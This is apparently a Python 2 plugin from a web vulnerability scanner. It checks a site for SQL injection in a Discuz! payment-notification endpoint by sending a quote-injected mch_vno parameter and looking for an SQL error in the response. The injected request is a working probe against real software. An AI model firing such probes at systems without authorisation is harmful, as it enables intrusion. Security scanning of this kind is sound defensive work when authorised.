#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "api/trade/notify_credit.php?attach=tenpay&retcode=0&mch_vno=%2527"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('SQL syntax')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dzx1.5sqlinjecitonscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dzx1.5sqlinjecitonscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def